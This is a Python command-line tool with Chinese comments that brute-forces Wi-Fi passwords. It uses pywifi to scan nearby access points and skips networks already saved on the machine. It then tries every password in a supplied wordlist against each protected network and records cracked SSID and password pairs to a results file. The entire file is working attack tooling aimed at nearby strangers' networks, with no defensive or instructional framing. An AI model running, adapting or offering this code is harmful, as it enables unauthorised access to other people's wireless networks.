import os

import pywifi
from pywifi import const  # 引用一些定义
from tqdm import tqdm

from cracker_util import get_aps, crack_ap, classify_aps, sample_passwords


def main(password_file, count=5, result_file='results.txt', stype=1):
    if not os.path.isfile(password_file):
        print('[!]密码本文件不存在')
        return

    print('[+]获取网卡')
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    iface = wifi.interfaces()[0]  # 获取网卡，对于wifi连接服务，默认为0号网卡
    print('[-]成功获取网卡')

    print('[+]导入已经计算机存储的网络PROFILES')
    saved_ssids = [profile.ssid for profile in iface.network_profiles()]
    print('[*]已保存的PROFILES的SSID为', saved_ssids)
    print('[-]完成导入已经计算机存储的网络')

    print('[+]扫描当前可用热点，并选出需要密码破解的热点')
    scanned_profiles = get_aps(
        iface, count=count, filtered_ssids=saved_ssids)  # 扫描当前可用的热点
    needpwd_profiles, _ = classify_aps(scanned_profiles)  # 分开需要密码和不需要密码的热点
    print('[*]需要破解的热点为', [profile.ssid for profile in needpwd_profiles])
    print('[-]完成扫描')

    # 不需要密码的热点通常都是需要额外的验证操作的，由使用者自行把握
    # 只考虑需要密码的热点
    cracked_table = {}

    print('[+]导入密码本')
    passwords = []
    with open(password_file) as f:
        for line in f:
            passwords.append(line.strip('\n'))
    print('[-]成功导入密码本')

    print('[+]开始暴力破解')

    for profile in needpwd_profiles:
        ssid = profile.ssid
        print('[+]开始破解SSID:', ssid)

        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元 /cipher - AP的密码类型

        for key in tqdm(sample_passwords(passwords, stype), desc='Passwords'):
            profile.key = key
            if crack_ap(iface, profile):
                cracked_table[profile.ssid] = key
                with open(result_file, 'a') as f:
                    f.write('%s : %s\n' % (ssid, key))
                print('[*]使用密码 %s 破解 %s成功' % (key, ssid))
                break

        print('[-]结束破解SSID:', profile.ssid)

    print('[*]破解出的密码表为', cracked_table)
    print('[-]暴力破解完成')


def __main__():
    import argparse

    parser = argparse.ArgumentParser(description='暴力破解信号强度考前的热点')
    parser.add_argument('password_file', type=str, help='密码本文件')
    parser.add_argument('-c', '--count', type=int,
                        default=5, help='所要破解的热点个数，默认为破解5个')
    parser.add_argument('--result_file', type=str,
                        default='results.txt', help='保存所有热点密码结果文件')
    parser.add_argument('-s', '--stype', type=int, default=1,
                        help=sample_passwords.__doc__+'，默认为1')
    args = parser.parse_args()

    main(args.password_file, args.count, args.result_file, args.stype)


if __name__ == '__main__':
    __main__()
